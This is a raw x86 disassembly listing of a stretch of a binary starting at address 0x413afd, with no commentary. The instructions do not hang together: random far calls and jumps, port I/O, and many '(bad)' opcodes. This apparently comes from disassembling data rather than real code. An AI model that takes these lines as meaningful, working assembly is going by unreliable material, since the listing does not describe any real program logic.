  413afd:	cmp    ebp,0xfe8f8559
  413b03:	sbb    al,0x1f
  413b05:	retf   0xc3ff
  413b08:	mov    edx,0x7e1a6d1e
  413b0d:	adc    DWORD PTR ds:0xb05ceb9b,edi
  413b13:	inc    edx
  413b14:	repz fisubr WORD PTR [esi]
  413b17:	add    BYTE PTR [eax],bh
  413b19:	stos   DWORD PTR es:[edi],eax
  413b1a:	in     al,0xa2
  413b1c:	mov    esi,0x9684073c
  413b21:	pop    ds
  413b22:	ss das 
  413b24:	cli    
  413b25:	pop    ebp
  413b26:	cmp    al,0xf9
  413b28:	or     edx,DWORD PTR [esi+0x28]
  413b2b:	xchg   esi,eax
  413b2c:	arpl   WORD PTR [ebp-0x41c9917c],cx
  413b32:	ret    
  413b33:	inc    edi
  413b34:	mov    ebx,0xf8facda
  413b39:	sahf   
  413b3a:	fstp   QWORD PTR [esi-0x69fd9e2e]
  413b40:	push   0xffffffb1
  413b42:	cld    
  413b43:	repnz dec ebx
  413b45:	and    DWORD PTR [esi+0x3d],esp
  413b48:	lds    ebp,FWORD PTR [edi]
  413b4a:	dec    ebp
  413b4b:	and    eax,0x5cab7295
  413b50:	stos   BYTE PTR es:[edi],al
  413b51:	pop    ebx
  413b52:	or     DWORD PTR [eax-0x66],ecx
  413b55:	sbb    ecx,DWORD PTR [edi+0x3c]
  413b58:	mov    ebp,0xa962fab0
  413b5d:	stc    
  413b5e:	pop    ds
  413b5f:	cmp    BYTE PTR [ebp+0x147336e3],dh
  413b65:	stc    
  413b66:	mov    esp,0xb6edf8a3
  413b6b:	out    dx,eax
  413b6c:	pop    edi
  413b6d:	repnz sbb DWORD PTR [ebx+esi*2-0x28],0x4b900ce8
  413b76:	pushf  
  413b77:	mov    ebp,0x7d2f9910
  413b7c:	stos   DWORD PTR es:[edi],eax
  413b7d:	stos   DWORD PTR es:[edi],eax
  413b7e:	lea    ecx,[ecx]
  413b80:	out    dx,al
  413b81:	ds pop eax
  413b83:	adc    BYTE PTR [ecx+0x53],ah
  413b86:	dec    ebp
  413b87:	(bad)  
  413b89:	jae    0x413b47
  413b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b8c:	leave  
  413b8d:	mov    eax,ds:0x12ad400e
  413b92:	test   DWORD PTR [ebx-0x4b],esi
  413b95:	outs   dx,BYTE PTR ds:[esi]
  413b96:	push   edi
  413b97:	cwde   
  413b98:	mov    ch,0xb
  413b9a:	and    BYTE PTR ds:0xcd4d51c4,dl
  413ba0:	into   
  413ba1:	cdq    
  413ba2:	mov    ch,0x69
  413ba4:	hlt    
  413ba5:	inc    ebp
  413ba6:	mov    DWORD PTR [esi+ebp*4-0x1fcbb0b3],0xec33d42
  413bb1:	dec    edx
  413bb2:	xlat   BYTE PTR ds:[ebx]
  413bb3:	cld    
  413bb4:	rcr    DWORD PTR [ecx+esi*1+0x81fd805],0x2
  413bbc:	iret   
  413bbd:	jle    0x413b56
  413bbf:	inc    esi
  413bc0:	int3   
  413bc1:	mov    dl,0x53
  413bc3:	mov    ebp,0x339c1c16
  413bc8:	push   ebp
  413bc9:	inc    ebx
  413bca:	and    eax,0xb21c868a
  413bcf:	xchg   esp,eax
  413bd0:	xor    al,0xe6
  413bd2:	adc    al,0x22
  413bd4:	sbb    al,0x2b
  413bd6:	inc    ecx
  413bd7:	inc    edx
  413bd8:	test   eax,0x6a4a1e9a
  413bdd:	je     0x413bf7
  413bdf:	push   ebx
  413be0:	fisttp WORD PTR [ebx]
  413be2:	and    ch,BYTE PTR [ebx-0x33]
  413be5:	lea    edi,[esi]
  413be7:	clc    
  413be8:	adc    eax,0xc23dd1ce
  413bed:	arpl   WORD PTR [ecx+0x74f57565],sp
  413bf3:	in     eax,0xd
  413bf5:	mov    al,ds:0x6ed11893
  413bfa:	out    dx,eax
  413bfb:	not    BYTE PTR [edx]
  413bfd:	gs sti 
  413bff:	and    cl,0xdb
  413c02:	xlat   BYTE PTR ds:[ebx]
  413c03:	sbb    BYTE PTR [edi*2+0x7e40b4f6],dh
  413c0a:	call   0x4810:0xc303fd57
  413c11:	and    BYTE PTR gs:[eax+0x51],0xe6
  413c16:	jmp    0xfe3b70c7
  413c1b:	loope  0x413bbd
  413c1d:	pushf  
  413c1e:	mov    esp,0x860f850a
  413c23:	call   0xdac78468
  413c28:	idiv   DWORD PTR [esi+0x7e]
  413c2b:	or     dl,ah
  413c2d:	pusha  
  413c2e:	jge    0x413bdd
  413c30:	sqrtps xmm7,XMMWORD PTR [edx+0x22]
  413c34:	xor    BYTE PTR [edx+0xdcf49d3],dh
  413c3a:	sbb    eax,DWORD PTR [ebx]
  413c3c:	das    
  413c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c3e:	jmp    0x413c78
  413c40:	mov    cs:0xe0bd76d4,eax
  413c46:	jmp    0x38cb:0xac4ebc12
  413c4d:	test   eax,0x525aebbd
  413c52:	aad    0x65
  413c54:	add    al,0x36
  413c56:	add    al,0xea
  413c58:	xchg   esp,eax
  413c59:	scas   eax,DWORD PTR es:[edi]
  413c5a:	fwait
  413c5b:	xchg   ebp,eax
  413c5c:	je     0x413c71
  413c5e:	pop    esp
  413c5f:	sub    BYTE PTR ds:0xe5a796f0,0xf8
  413c66:	sbb    BYTE PTR [ebp+0x70],0xe7
  413c6a:	loop   0x413c80
  413c6c:	fdivr  DWORD PTR [ebp+0x2]
  413c6f:	mov    dh,0x8f
  413c71:	dec    ecx
  413c72:	mov    ebx,0xad278072
  413c77:	pop    ds
  413c78:	sub    bh,BYTE PTR [esi-0x22fc1d9f]
  413c7e:	loope  0x413c09
  413c80:	mov    eax,0xdc20b01a
  413c85:	inc    eax
  413c86:	jbe    0x413d05
  413c88:	or     BYTE PTR [edx-0x724c9f9a],0xb5
  413c8f:	hlt    
  413c90:	mov    ecx,0xfcc9a87e
  413c95:	adc    eax,0x5a53bbb4
  413c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c9b:	sbb    eax,0x105b6626
  413ca0:	call   0xde14:0x243a7160
  413ca7:	je     0x413c84
  413ca9:	loope  0x413d26
  413cab:	jmp    0xa8d2:0xfa075aa9
  413cb2:	(bad)  
  413cb3:	stos   DWORD PTR es:[edi],eax
  413cb4:	(bad)
  413cb7:	jae    0x413d2e
  413cb9:	mov    edx,0x50aad182
  413cbe:	xor    ebx,0xffffff84
  413cc1:	xchg   DWORD PTR [edi],ebp
  413cc3:	repz (bad) 
  413cc5:	pop    edi
  413cc6:	jnp    0x413c9b
  413cc8:	div    BYTE PTR [edi]
  413cca:	mov    ch,BYTE PTR [ebx-0x60e73d4e]
  413cd0:	imul   edx,DWORD PTR [eax+0x48],0xffffffb9
  413cd4:	test   ebp,eax
  413cd6:	pop    esp
  413cd7:	pop    ss
  413cd8:	loop   0x413cfd
  413cda:	je     0x413c77
  413cdc:	scas   eax,DWORD PTR es:[edi]
  413cdd:	stos   BYTE PTR es:[edi],al
  413cde:	mov    ah,0x6e
  413ce0:	ret    0x9da0
  413ce3:	jns    0x413cd7
  413ce5:	call   0xd903905
  413cea:	push   es
  413ceb:	mov    ecx,0x8f0b5610
  413cf0:	arpl   di,cx
  413cf2:	pop    ebp
  413cf3:	popf   
  413cf4:	leave  
  413cf5:	mov    eax,ds:0xfd541ff1
  413cfa:	mov    cl,0xb8
  413cfc:	jbe    0x413cfd
  413cfe:	(bad)
  413d01:	ror    DWORD PTR [eax-0x780686cb],cl
  413d07:	call   0xd674e375
  413d0c:	sub    DWORD PTR [esi-0x4ad06fba],eax
  413d12:	cmp    al,BYTE PTR [edx+esi*8-0x263be614]
  413d19:	pop    esi
  413d1a:	adc    al,0x69
  413d1c:	(bad)  
  413d1f:	pop    ecx
  413d20:	push   edx
  413d21:	inc    edx
  413d22:	mov    bl,0xd3
  413d24:	std    
  413d25:	ds (bad) 
  413d27:	mov    ebx,0x8e442eea
  413d2c:	bound  edx,QWORD PTR [edi+0x73]
  413d2f:	mov    ebp,0x44a5f5f2
  413d34:	cwde   
  413d35:	lock popf 
  413d37:	bound  ebp,QWORD PTR [ebp+0x68]
  413d3a:	and    esp,DWORD PTR [ebx+0x139061f0]
  413d40:	and    bl,BYTE PTR [ebp*4+0x16ad1c25]
  413d47:	retf   0xf728
  413d4a:	pop    edx
  413d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4c:	out    dx,al
  413d4d:	fidivr WORD PTR [edi+0x6c1be2f1]
  413d53:	dec    esi
  413d55:	xor    DWORD PTR [ecx],0xffffffe8
  413d58:	ret    0x5506
  413d5b:	push   0xef7f4316
  413d60:	sbb    ah,BYTE PTR [edi]
  413d62:	aaa    
  413d63:	mov    ebx,esi
  413d65:	cli    
  413d66:	rcr    edx,1
  413d68:	bound  ecx,QWORD PTR [edx]
  413d6a:	ret    
  413d6b:	inc    edx
  413d6c:	adc    ebx,DWORD PTR ds:0x4cf2d651
  413d72:	xchg   edx,eax
  413d73:	pop    ecx
  413d74:	aaa    
  413d75:	push   edx
  413d76:	push   0x274050fe
  413d7b:	jne    0x413d12
  413d7d:	js     0x413d06
  413d7f:	xchg   ebx,eax
  413d80:	xchg   edx,eax
  413d81:	pop    ebx
  413d82:	sbb    DWORD PTR [edi+0x61],ecx
  413d85:	call   0xee15:0x81839035
  413d8c:	and    DWORD PTR [esi],esi
  413d8e:	mov    edx,0x3666d58f
  413d93:	repz dec ebp
  413d95:	rcr    DWORD PTR [ebx],1
  413d97:	sbb    DWORD PTR [ecx],esi
  413d99:	xor    cl,BYTE PTR [edx-0x6fd8743]
  413d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413da0:	lahf   
  413da1:	sbb    ebx,edx
  413da3:	pop    edx
  413da4:	xor    DWORD PTR [ecx+0x11],ebp
  413da7:	xchg   esi,eax
  413da8:	xor    DWORD PTR [esi],edi
  413daa:	clc    
  413dab:	ret    
  413dac:	inc    edi
  413dad:	and    eax,ebx
  413daf:	loopne 0x413da5
  413db1:	inc    esp
  413db2:	cli    
  413db3:	hlt    
  413db4:	enter  0x641d,0x71
  413db8:	mov    cl,0x12
  413dba:	test   al,0x97
  413dbc:	cmp    edi,DWORD PTR [ebp+0x6f4dc385]
  413dc2:	or     eax,0x69fc3101
  413dc7:	sub    al,BYTE PTR [ebx]
  413dc9:	and    al,0x45
  413dcb:	push   cs
  413dcc:	or     eax,0xb61d1eee
  413dd1:	mov    dh,0xe1
  413dd3:	dec    ebp
  413dd4:	out    0xf3,eax
  413dd6:	dec    esi
  413dd7:	xor    eax,DWORD PTR [esi-0x76]
  413dda:	sub    edi,ecx
  413ddc:	mov    ah,0x4c
  413dde:	(bad)  
  413ddf:	cmp    esi,eax
  413de1:	sbb    dl,ch
  413de3:	inc    ecx
  413de4:	mov    dl,0x41
  413de6:	xchg   ecx,eax
  413de7:	dec    eax
  413de8:	pop    edx
  413de9:	push   es
  413dea:	mov    al,ds:0x2c5da6c5
  413def:	in     al,dx
  413df0:	out    0x15,al
  413df2:	fwait
  413df3:	push   cs
  413df4:	or     eax,0x6bfff77
  413df9:	fld    QWORD PTR [ebx]
  413dfb:	sbb    al,0x21
  413dfd:	mov    ebp,0xd64f6d42
  413e02:	pop    es
  413e03:	fdivr  st(4),st
  413e05:	into   
  413e06:	test   eax,0xd001ba6
  413e0b:	ficom  WORD PTR [eax+eiz*2]
  413e0e:	ficomp WORD PTR [esi]
  413e10:	leave  
  413e11:	icebp  
  413e12:	fs cmp eax,0x3ba6303
  413e18:	cdq    
  413e19:	fwait
  413e1a:	xchg   esi,eax
  413e1b:	mov    esi,DWORD PTR [esi+0x7e]
  413e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e1f:	mov    edi,0x4cb5a858
  413e24:	pop    ebp
  413e25:	enter  0x9591,0x4c
  413e29:	pop    edi
  413e2a:	sub    eax,0xc7dcdf02
  413e2f:	fcomp  DWORD PTR [ebp+0x1a]
  413e32:	pop    esi
  413e33:	pop    edx
  413e34:	or     eax,0xe0fb7fa8
  413e3a:	add    eax,0x2d64a36d
  413e3f:	sub    eax,0xbac1eb2
  413e44:	cmp    eax,0x2796b410
  413e49:	push   eax
  413e4a:	(bad)  
  413e4b:	ret    0xd1db
  413e4e:	mov    ds:0xb773e961,eax
  413e53:	ficom  WORD PTR [ebp-0x7d]
  413e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e57:	out    0xc8,al
  413e59:	dec    esi
  413e5a:	or     DWORD PTR [esi-0x446e6f],esi
  413e60:	cmp    edx,DWORD PTR [edi]
  413e62:	pop    edx
  413e63:	subps  xmm7,XMMWORD PTR [ecx]
  413e66:	out    dx,al
  413e67:	stos   DWORD PTR es:[edi],eax
  413e68:	mov    esp,DWORD PTR [ecx-0x3e759832]
  413e6e:	mov    ch,0x9
  413e70:	in     al,0xe2
  413e72:	(bad)  
  413e73:	and    al,0xab
  413e75:	add    DWORD PTR [edx],edi
  413e77:	sbb    eax,DWORD PTR [ebp-0x603f4006]
  413e7d:	sub    eax,ebp
  413e7f:	ret    0x557c
  413e82:	(bad)  
  413e83:	call   0x758b:0x4800f40c
  413e8a:	lock mov bh,0xe4
  413e8d:	push   ds
  413e8e:	cmp    cl,dh
  413e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e91:	xor    cl,bl
  413e93:	pop    esp
  413e94:	jle    0x413e81
  413e96:	popa   
  413e97:	retf   
  413e98:	dec    eax
  413e99:	stos   BYTE PTR es:[edi],al
  413e9a:	push   edi
  413e9b:	mov    BYTE PTR [ebx+0x3c],dh
  413e9e:	mov    eax,ds:0x767a41c6
  413ea3:	pop    ss
  413ea4:	adc    bl,BYTE PTR [edx-0x3ad9e8e5]
  413eaa:	push   0x3aed682a
  413eaf:	call   0x84fd:0xaa720d47
  413eb6:	je     0x413f2f
  413eb8:	ret    0xb0bb
  413ebb:	and    al,0x59
  413ebd:	std    
  413ebe:	adc    bh,al
  413ec0:	push   edi
  413ec1:	jb     0x413eb5
  413ec3:	das    
  413ec4:	mov    esp,0xe0f601e9
  413ec9:	scas   al,BYTE PTR es:[edi]
  413eca:	cmc    
  413ecb:	int3   
  413ecc:	out    0x3f,al
  413ece:	test   eax,0x68b6d70a
  413ed3:	fwait
  413ed4:	push   ebp
  413ed5:	or     ebx,ebp
  413ed7:	jne    0x413ef5
  413ed9:	aad    0x49
  413edb:	xchg   BYTE PTR [edx+0x59],dh
  413ede:	icebp  
  413edf:	adc    bh,BYTE PTR [eax+ebp*8+0x5fbe5439]
  413ee6:	stos   BYTE PTR es:[edi],al
  413ee7:	out    0x34,eax
  413ee9:	pop    ecx
  413eea:	dec    esp
  413eeb:	lock loop 0x413f00
  413eee:	and    edi,DWORD PTR [esi+esi*4-0x2e71c101]
  413ef5:	iret   
  413ef6:	rcl    DWORD PTR [esi-0x6a5055ee],cl
  413efc:	fs push edx
  413efe:	dec    ebx
  413eff:	and    bl,BYTE PTR [ecx+0x41d68c98]
  413f05:	in     al,dx
  413f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f07:	add    DWORD PTR [esp+ebp*8],edx
  413f0a:	xor    BYTE PTR [ebx+0x2a1b856a],al
  413f10:	inc    eax
  413f11:	cmp    BYTE PTR [esi-0x47],0xf4
  413f15:	jl     0x413ef7
  413f17:	mov    al,0x94
  413f1a:	xlat   BYTE PTR ds:[ebx]
  413f1b:	sti    
  413f1c:	lds    edi,FWORD PTR [eax]
  413f1e:	sbb    ebp,DWORD PTR [edi]
  413f20:	pop    ss
  413f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f22:	icebp  
  413f23:	pushf  
  413f24:	jb     0x413ecb
  413f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f27:	nop
  413f28:	mov    al,BYTE PTR [edx+0x75]
  413f2b:	xchg   edi,ecx
  413f2d:	das    
  413f2e:	call   0x4284:0xc369b22a
  413f35:	aaa    
  413f36:	sbb    edi,DWORD PTR [eax+eax*1]
  413f39:	repnz dec esi
  413f3b:	ins    DWORD PTR es:[edi],dx
  413f3c:	push   ebp
  413f3d:	dec    esp
  413f3e:	lock jl 0x413fb5
  413f41:	cmp    eax,0xefebda24
  413f46:	repz (bad) 
  413f49:	xchg   edx,eax
  413f4a:	jne    0x413f02
  413f4c:	jnp    0x413f56
  413f4e:	push   0x7ce7b50f
  413f53:	int3   
  413f54:	lods   al,BYTE PTR ds:[esi]
  413f55:	sbb    DWORD PTR ds:0x27547359,ebx
  413f5b:	pop    ecx
  413f5c:	cmp    BYTE PTR [esi-0x5dd1f0e],bl
  413f62:	cli    
  413f63:	js     0x413f36
  413f65:	test   ecx,ebx
  413f67:	das    
  413f68:	mov    esi,0x6ac885f8
  413f6d:	mov    al,BYTE PTR [edi]
  413f6f:	xchg   esp,eax
  413f70:	out    0x64,eax
  413f72:	ficom  DWORD PTR [edi+0x3c]
  413f75:	mov    bl,dl
  413f77:	xchg   esp,eax
  413f78:	ins    DWORD PTR es:[edi],dx
  413f79:	jo     0x413fa5
  413f7b:	(bad)  
  413f7c:	xchg   ebx,eax
  413f7d:	mov    dl,0xc0
  413f7f:	add    al,0xca
  413f81:	xor    DWORD PTR [ebx*2-0x3cb1d53a],ebx
  413f88:	je     0x413fb9
  413f8a:	shl    BYTE PTR [edi-0x33249c2],0xef
  413f91:	inc    ecx
  413f92:	(bad)  [edx+0xf]
  413f95:	fsubr  st(5),st
  413f97:	test   al,0xbe
  413f99:	jb     0x413f81
  413f9b:	loop   0x413f5f
  413f9d:	hlt    
  413f9e:	adc    al,0xd3
  413fa0:	ret    0x992b
  413fa3:	xchg   BYTE PTR [edx-0x5a],bl
  413fa6:	pop    ecx
  413fa7:	(bad)  [edx]
  413fa9:	mov    es,ebx
  413fab:	out    0x8c,eax
  413fad:	pusha  
  413fae:	scas   al,BYTE PTR es:[edi]
  413faf:	mov    dl,0x9b
  413fb1:	cmp    DWORD PTR [edi-0x8],eax
  413fb4:	add    BYTE PTR [ebx-0x2f018bcd],dh
  413fba:	cld    
  413fbb:	retf   
  413fbc:	(bad)
  413fc0:	pop    ebx
  413fc1:	mov    ebp,0x6c732a23
  413fc6:	nop
  413fc7:	bound  ebp,QWORD PTR [eax+ebx*8-0x53]
  413fcb:	cmp    eax,0xddadd7d7
  413fd0:	mov    ds:0xbd9af4ed,eax
  413fd5:	scas   eax,DWORD PTR es:[edi]
  413fd6:	mov    eax,ds:0xdefa699
  413fdb:	gs je  0x413f87
  413fde:	sbb    eax,0xa08521c7
  413fe3:	jp     0x413fb6
  413fe5:	sbb    al,dl
  413fe7:	add    BYTE PTR [edi],bl
  413fe9:	or     BYTE PTR [eax],dh
  413feb:	dec    esi
  413fec:	mov    ds:0x99eccc47,al
  413ff1:	mov    dh,0x5a
  413ff3:	lods   al,BYTE PTR ds:[esi]
  413ff4:	in     al,0x99
  413ff6:	in     al,0xb2
  413ff8:	popf   
  413ff9:	jns    0x413ff9
  413ffb:	dec    ebp
  413ffc:	inc    esp
  413ffd:	xor    dl,al
  413fff:	div    DWORD PTR [eax+0x148be5f]
  414005:	fistp  DWORD PTR [edx-0x44]
  414008:	jno    0x413f91
  41400a:	xchg   BYTE PTR ds:0x79b17fc2,bh
  414010:	mov    ch,0x64
  414012:	sbb    ecx,DWORD PTR [ebp-0x26f01cc5]
  414018:	test   ah,cl
  41401a:	xchg   DWORD PTR [edi-0x768ef477],ebp
  414020:	mov    esi,0x68261cf1
  414025:	punpcklwd mm5,DWORD PTR [esp+edx*4]
  414029:	sub    ch,0xc2
  41402c:	nop
  41402d:	cdq    
  41402e:	jmp    0xaef57e05
  414033:	ret    
  414034:	jge    0x41408b
  414036:	fst    DWORD PTR [eax-0x3b]
  414039:	cmp    eax,0x6b7cba23
  41403e:	mov    ds:0x8fe7e96e,al
  414043:	aam    0x8d
  414045:	int3   
  414046:	fisub  DWORD PTR [ebp+0x47c7d14e]
  41404c:	rol    DWORD PTR [ecx-0x24bfddef],1
  414052:	fmulp  st(1),st
  414054:	leave  
  414055:	sbb    ecx,DWORD PTR [ecx+0x43d1172b]
  41405b:	dec    ecx
  41405c:	pop    ss
  41405d:	jp     0x41409b
  41405f:	(bad)  
  414060:	cmp    bl,dl
  414062:	(bad)  
  414063:	jo     0x41405a
  414065:	enter  0x1892,0x22
  414069:	or     bh,0x47
  41406c:	das    
  41406d:	in     al,0xc7
  41406f:	add    BYTE PTR [edx],ah
  414071:	sub    dh,BYTE PTR [esi-0x52]
  414074:	xor    ch,BYTE PTR [eax+0x384b4927]
  41407a:	cmp    dh,BYTE PTR [ebx+esi*1-0x6f]
  41407e:	xor    eax,0x934e1826
  414083:	xor    BYTE PTR [eax],ah
  414085:	lock sub BYTE PTR [ebp+0x5],bl
  414089:	fs cli 
  41408b:	loop   0x414025
  41408d:	sbb    DWORD PTR [edx-0x2f],ebp
  414090:	outs   dx,DWORD PTR ds:[esi]
  414091:	scas   eax,DWORD PTR es:[edi]
  414092:	push   cs
  414093:	push   eax
  414094:	push   edx
  414095:	add    al,0xb5
  414097:	push   ebp
  414098:	fdivr  DWORD PTR [ecx+0x17]
  41409b:	inc    ebp
  41409c:	fldcw  WORD PTR [edi+0x69c0d49f]
  4140a2:	lods   al,BYTE PTR ds:[esi]
  4140a3:	lds    ebx,FWORD PTR [ebp-0x25]
  4140a6:	sbb    BYTE PTR [edx+edx*4],dl
  4140a9:	test   eax,0xd63fe505
  4140ae:	inc    eax
  4140af:	sub    eax,0x9e549ba6
  4140b4:	push   eax
  4140b5:	xor    BYTE PTR [eax],al
  4140b7:	daa    
  4140b8:	sahf   
  4140b9:	fst    QWORD PTR [ecx-0x23d7fe59]
  4140bf:	rol    BYTE PTR [ebp+0x1b],1
  4140c2:	lahf   
  4140c3:	push   0xea8e5c4e
  4140c8:	les    ebx,FWORD PTR [ecx+0x15bb65c7]
  4140ce:	pop    es
  4140cf:	in     al,dx
  4140d0:	(bad)  [edx-0x55]
  4140d3:	cli    
  4140d4:	jne    0x41408b
  4140d6:	pop    edi
  4140d7:	enter  0xbe2d,0x3
  4140db:	pop    es
  4140dc:	xor    edx,edx
  4140de:	or     bh,BYTE PTR [ebp+0x3bc1a99a]
  4140e4:	dec    edi
  4140e5:	ret    
  4140e6:	xor    edi,DWORD PTR [ebx+0x5d7ff601]
  4140ec:	adc    al,BYTE PTR ds:0x29071d30
  4140f2:	adc    esi,DWORD PTR [eax-0x2a]
  4140f5:	in     eax,0xb0
  4140f7:	and    eax,0x33ccfde2
  4140fc:	mov    bl,0x97
  4140fe:	add    ecx,DWORD PTR [eax]
  414100:	stc    
  414101:	rcr    ebx,1
  414103:	sti    
  414104:	popf   
  414105:	mov    ecx,0x6ddfd5e
  41410a:	pushf  
  41410b:	mov    cl,0x16
  41410d:	jle    0x414171
  41410f:	fsubr  DWORD PTR ds:0xe93f3637
  414115:	jle    0x4140c5
  414117:	xor    bl,BYTE PTR [ecx-0x63]
  41411a:	pop    ss
  41411b:	dec    ebx
  41411c:	jnp    0x41414a
  41411e:	(bad)  
  41411f:	je     0x414179
  414121:	pop    eax
  414122:	jmp    0xee5450da
  414127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414128:	or     DWORD PTR [edx+esi*1],esp
  41412b:	clc    
  41412c:	mov    ds:0x6214b2ad,eax
  414131:	iret   
  414132:	mov    ch,BYTE PTR [edi-0x52a5280e]
  414138:	mov    bh,0xf5
  41413a:	push   0x215caa53
  41413f:	cmp    eax,0x177f108c
  414144:	push   0xffffff86
  414146:	inc    eax
  414147:	mov    fs,WORD PTR [edi-0x5f4125bf]
  41414d:	cmc    
  41414e:	jns    0x414161
  414150:	out    dx,eax
  414151:	imul   edx,DWORD PTR ds:0xa5407855,0xcfcc147e
  41415b:	mov    esi,DWORD PTR [ecx-0x52]
  41415e:	inc    ebp
  41415f:	and    al,0x3f
  414161:	mov    ds:0x65f13936,eax
  414166:	ret    
  414167:	mov    dl,BYTE PTR [esi+0x46]
  41416a:	das    
  41416b:	les    edx,FWORD PTR [edi]
  41416d:	mov    ebp,0x78d52d5
  414172:	push   esp
  414173:	mov    al,0x3d
  414175:	or     BYTE PTR ds:0xc7110081,ch
  41417b:	cmp    edi,ebx
  41417d:	into   
  41417e:	out    dx,eax
  41417f:	mov    ds:0x4c77df89,eax
  414184:	clc    
  414185:	pushf  
  414186:	mov    bh,0x2a
  414188:	cld    
  414189:	mov    esi,0xb48a4d08
  41418e:	bound  ecx,QWORD PTR [esi]
  414190:	loop   0x4141c8
  414192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414193:	xlat   BYTE PTR ds:[ebx]
  414194:	add    al,0x62
  414196:	sahf   
  414197:	jo     0x414136
  414199:	xchg   DWORD PTR [edi],ebx
  41419b:	nop
  41419c:	or     ebp,DWORD PTR [ecx+0x56e1743e]
  4141a2:	or     al,0x46
  4141a4:	addr16 iret 
  4141a6:	aad    0x1b
  4141a8:	xor    ebx,DWORD PTR [esi]
  4141aa:	add    BYTE PTR [edx+0x58990804],0x27
  4141b1:	cmp    eax,0x38a32280
  4141b6:	mov    ebp,0xeb35422e
  4141bb:	pusha  
  4141bc:	mov    eax,ds:0x5f5a794d
  4141c1:	or     DWORD PTR [edx+eiz*2-0x3105039],edx
  4141c8:	outs   dx,DWORD PTR ds:[esi]
  4141c9:	dec    ecx
  4141ca:	into   
  4141cb:	sub    eax,0xb590ef73
  4141d0:	adc    al,0xf9
  4141d2:	shr    DWORD PTR gs:[eax+eiz*1],0x39
  4141d7:	pop    edi
  4141d8:	jmp    0x414171
  4141da:	mov    dh,0x7f
  4141dc:	or     dl,ah
  4141de:	clc    
  4141df:	xchg   esi,eax
  4141e0:	je     0x414230
  4141e2:	into   
  4141e3:	sbb    BYTE PTR [ebx+0x31],al
  4141e6:	fstp   QWORD PTR ds:0xd151e9a9
  4141ec:	cmp    al,0xc7
  4141ee:	pop    ecx
  4141ef:	rol    BYTE PTR [ebx],0x8e
  4141f2:	pusha  
  4141f3:	jb     0x4141c1
  4141f5:	jb     0x414256
  4141f7:	fld    QWORD PTR [ebp+0x6e]
  4141fa:	pusha  
  4141fb:	pop    ecx
  4141fc:	popf   
  4141fd:	push   edi
  4141fe:	mov    edi,0xd680824a
  414203:	addr16 addr16 or eax,0x35572032
  41420a:	inc    eax
  41420b:	mov    ecx,esp
  41420d:	sbb    DWORD PTR [ecx-0x3d51e8e0],0x76
  414214:	dec    esi
  414215:	pop    es
  414216:	pop    ebx
  414217:	mov    ds:0xe9bdf3e5,eax
  41421c:	(bad)  
  41421d:	mov    edx,0x6063dfdf
  414222:	mov    ebp,0x2ff550b6
  414227:	pop    ebx
  414229:	mov    bl,0x57
  41422b:	ins    DWORD PTR es:[edi],dx
  41422c:	pop    es
  41422d:	shl    edx,cl
  41422f:	je     0x41423b
  414231:	imul   edi,DWORD PTR [ecx+edx*4+0xeff5026]
  414239:	inc    DWORD PTR [ebx+0x4d5f9f5f]
  41423f:	cdq    
  414240:	inc    eax
  414241:	repnz mov BYTE PTR [ecx+0x60],ch
  414245:	or     bh,BYTE PTR [ebx+esi*8-0x521424dd]
  41424c:	lds    edx,FWORD PTR ds:0x3e5f3568
  414252:	add    BYTE PTR [eax+0x71],cl
  414255:	push   edi
  414256:	(bad)  
  414257:	adc    edi,esi
  414259:	adc    al,0x39
  41425b:	jne    0x4142a5
  41425d:	test   al,0x49
  41425f:	xchg   esi,eax
  414260:	(bad)  
  414261:	sbb    eax,0xb04a34d0
  414266:	out    0x1c,eax
  414268:	jmp    0x4e8567f5
  41426d:	mov    bp,0xd05b
  414271:	fisub  DWORD PTR [ebp-0x66]
  414274:	out    0xb0,eax
  414276:	mov    DWORD PTR [ebx+ebx*1],ebp
  414279:	loope  0x414220
  41427b:	jmp    0xd0bb0372
  414280:	in     al,dx
  414281:	dec    ebx
  414282:	adc    bh,BYTE PTR [esi+0x59bc87b0]
  414288:	shl    DWORD PTR [edx],cl
  41428a:	pop    esp
  41428b:	out    dx,eax
  41428c:	in     eax,0xe2
  41428e:	imul   eax,DWORD PTR [esi+0x5a],0xffffff87
  414292:	sub    al,0x52
  414294:	repnz sub al,0xe
  414297:	or     al,BYTE PTR [eax-0x38]
  41429a:	dec    ecx
  41429b:	xchg   DWORD PTR [edi],ecx
  41429d:	mov    esi,0xb0560b22
  4142a2:	pop    ss
  4142a3:	mov    bl,0xeb
  4142a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a6:	mov    cl,0x4f
  4142a8:	sub    eax,0xc151f264
  4142ad:	mov    dh,0x3c
  4142af:	retf   0x5fe6
  4142b2:	mov    ecx,DWORD PTR [ecx]
  4142b4:	div    BYTE PTR [di-0x2c15]
  4142b9:	aad    0xd4
  4142bb:	cmp    bl,BYTE PTR [edi+0x264c3f45]
  4142c1:	ret    
  4142c2:	sahf   
  4142c3:	push   ebp
  4142c4:	imul   ebx,DWORD PTR [ebx+0x3c],0x3442fe47
  4142cb:	xchg   esp,eax
  4142cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142cd:	mov    ds:0x5d26457c,eax
  4142d2:	pop    esi
  4142d3:	mov    ebx,0x7fb6f7e8
  4142d8:	or     bl,BYTE PTR [eax-0x2eede343]
  4142de:	push   edx
  4142df:	retf   0xe84b
  4142e2:	xlat   BYTE PTR ds:[ebx]
  4142e3:	mov    dh,al
  4142e5:	test   al,0x49
  4142e7:	test   BYTE PTR [ebp+0x2f],cl
  4142ea:	xchg   edx,eax
  4142ec:	pop    ss
  4142ed:	cli    
  4142ee:	sbb    bl,ah
  4142f0:	adc    BYTE PTR ds:0x37afd8d9,al
  4142f6:	in     eax,dx
